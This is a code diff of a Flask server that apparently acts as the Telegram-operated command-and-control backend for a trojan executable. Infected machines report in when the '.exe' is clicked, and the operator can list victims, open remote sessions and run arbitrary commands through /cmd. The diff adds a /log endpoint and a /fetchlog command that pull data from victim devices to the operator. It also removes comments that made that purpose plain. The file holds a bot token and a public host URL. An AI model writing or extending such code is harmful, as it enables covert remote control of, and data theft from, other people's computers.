@@ -8,14 +8,17 @@ import requests
 app = Flask(__name__)
 
 # ================= CONFIGURATION =================
-BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # REPLACE with your actual bot token from BotFather
-ADMIN_ID = 6586114356       # REPLACE with your numeric user ID (no quotes)
+BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # Your bot token
+ADMIN_ID = 6586114356       # REPLACE with your numeric user ID
 # =================================================
 
 # Data storage
 devices = {}
 device_lock = threading.Lock()
 DATA_FILE = "devices_data.json"
+
+# Temporary storage for logs
+logs = {}
 
 def load_devices():
     global devices
@@ -38,7 +41,7 @@ def send_telegram_message(chat_id, message):
 
 load_devices()
 
-# ============ ENDPOINT 1: REGISTER DEVICE (.exe calls this) ============
+# ============ ENDPOINT 1: REGISTER DEVICE ============
 @app.route('/register', methods=['POST'])
 def register_device():
     data = request.json
@@ -58,7 +61,6 @@ def register_device():
         }
         save_devices()
     
-    # Notify the specific group that the .exe was clicked
     notification = f"🚨 <b>{exe_name}.exe</b> was clicked on: <code>{computer_info.get('hostname', 'Unknown')}</code> (IP: {computer_info.get('ip', 'N/A')})"
     if group_id:
         send_telegram_message(group_id, notification)
@@ -85,7 +87,7 @@ def send_command():
         else:
             return jsonify({'status': 'device not found'}), 404
 
-# ============ ENDPOINT 4: CLEAR COMMAND AFTER EXECUTION ============
+# ============ ENDPOINT 4: CLEAR COMMAND ============
 @app.route('/clear_command', methods=['POST'])
 def clear_command():
     data = request.json
@@ -96,7 +98,16 @@ def clear_command():
             save_devices()
     return jsonify({'status': 'cleared'})
 
-# ============ ENDPOINT 5: TELEGRAM WEBHOOK (RECEIVES YOUR COMMANDS) ============
+# ============ ENDPOINT 5: RECEIVE LOG FROM DEVICE ============
+@app.route('/log', methods=['POST'])
+def receive_log():
+    data = request.json
+    device_id = data.get('device_id')
+    log_content = data.get('log')
+    logs[device_id] = log_content
+    return jsonify({'status': 'log received'})
+
+# ============ ENDPOINT 6: TELEGRAM WEBHOOK ============
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
 def webhook():
     update = request.json
@@ -105,7 +116,6 @@ def webhook():
         chat_id = update['message']['chat']['id']
         text = update['message'].get('text', '').strip()
         
-        # Security: Only respond to you (the admin)
         if chat_id != ADMIN_ID:
             send_telegram_message(chat_id, "⛔ Unauthorized access denied.")
             return 'OK', 200
@@ -124,7 +134,7 @@ def webhook():
                     msg += f"{idx}. <code>{device_id}</code> | {exe}.exe | {host} ({ip}) | {status}\n"
                 send_telegram_message(chat_id, msg)
 
-        # --- COMMAND: /remote DEVICE_ID ---
+        # --- COMMAND: /remote ---
         elif text.startswith('/remote'):
             parts = text.split(' ', 1)
             if len(parts) < 2:
@@ -139,7 +149,35 @@ def webhook():
                     else:
                         send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found. Use /devices to see available devices.")
 
-        # --- COMMAND: /stop DEVICE_ID ---
+        # --- COMMAND: /fetchlog ---
+        elif text.startswith('/fetchlog'):
+            parts = text.split(' ', 1)
+            if len(parts) < 2:
+                send_telegram_message(chat_id, "⚠️ Usage: /fetchlog DEVICE_ID")
+            else:
+                device_id = parts[1].strip()
+                with device_lock:
+                    if device_id in devices:
+                        # Send command to device to fetch log
+                        devices[device_id]['pending_command'] = "FETCH_LOG"
+                        save_devices()
+                        send_telegram_message(chat_id, f"📋 Fetching log from <code>{device_id}</code>. Please wait...")
+                        time.sleep(5)  # Give device time to send log
+                        if device_id in logs and logs[device_id]:
+                            log_content = logs[device_id]
+                            # Send log in chunks if too long
+                            if len(log_content) > 4000:
+                                chunks = [log_content[i:i+4000] for i in range(0, len(log_content), 4000)]
+                                for i, chunk in enumerate(chunks, 1):
+                                    send_telegram_message(chat_id, f"📄 Log part {i}/{len(chunks)}:\n<pre>{chunk}</pre>")
+                            else:
+                                send_telegram_message(chat_id, f"📄 Log from <code>{device_id}</code>:\n<pre>{log_content}</pre>")
+                        else:
+                            send_telegram_message(chat_id, f"⏳ No log received yet from <code>{device_id}</code>. Try again in a few moments.")
+                    else:
+                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
+
+        # --- COMMAND: /stop ---
         elif text.startswith('/stop'):
             parts = text.split(' ', 1)
             if len(parts) < 2:
@@ -154,11 +192,11 @@ def webhook():
                     else:
                         send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
 
-        # --- COMMAND: /cmd DEVICE_ID "your command" ---
+        # --- COMMAND: /cmd ---
         elif text.startswith('/cmd'):
             parts = text.split(' ', 2)
             if len(parts) < 3:
-                send_telegram_message(chat_id, "⚠️ Usage: /cmd DEVICE_ID \"command\" (e.g. /cmd LAPTOP-123 calc.exe)")
+                send_telegram_message(chat_id, "⚠️ Usage: /cmd DEVICE_ID \"command\"")
             else:
                 device_id = parts[1].strip()
                 command = parts[2].strip()
@@ -176,8 +214,9 @@ def webhook():
                 "🤖 <b>Available Commands:</b>\n\n"
                 "/devices - List all connected devices\n"
                 "/remote DEVICE_ID - Start remote session\n"
+                "/fetchlog DEVICE_ID - Get debug log from device\n"
                 "/stop DEVICE_ID - Stop remote session\n"
-                "/cmd DEVICE_ID \"command\" - Run any command (e.g., calc.exe)\n"
+                "/cmd DEVICE_ID \"command\" - Run any command\n"
                 "/help - Show this menu"
             )
             send_telegram_message(chat_id, help_msg)
@@ -187,7 +226,7 @@ def webhook():
 
     return 'OK', 200
 
-# ============ ENDPOINT 6: SET WEBHOOK (RUN THIS ONCE) ============
+# ============ ENDPOINT 7: SET WEBHOOK ============
 @app.route('/set_webhook', methods=['GET'])
 def set_webhook():
     webhook_url = f"https://dollar-1rtv.onrender.com/webhook/{BOT_TOKEN}"
@@ -195,7 +234,7 @@ def set_webhook():
     response = requests.get(url)
     return jsonify(response.json())
 
-# ============ ENDPOINT 7: HOME PAGE ============
+# ============ ENDPOINT 8: HOME ============
 @app.route('/')
 def home():
     return "✅ PD_Research Final Server is RUNNING and AWAKE!"
